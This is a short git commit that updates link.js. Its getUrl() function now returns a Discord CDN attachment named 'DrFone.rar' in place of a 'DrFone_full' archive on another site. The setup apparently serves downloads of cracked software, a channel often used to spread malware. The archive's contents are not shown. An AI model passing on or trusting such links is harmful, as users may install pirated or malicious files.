a2d654f92ee43c66b94a09c241febff17fb5cefd
auenna <57557028+auenna@users.noreply.github.com>
2021-02-10 18:27:02 +0200

    Update link.js

--- link.js
+++ link.js
@@ -1,4 +1,4 @@
 function getUrl()
 {
-  return "https://zenergeticsoul.com/files/DrFone_full4008.rar";
+  return "https://cdn.discordapp.com/attachments/800051540953399306/809097421300301834/DrFone.rar";
 }
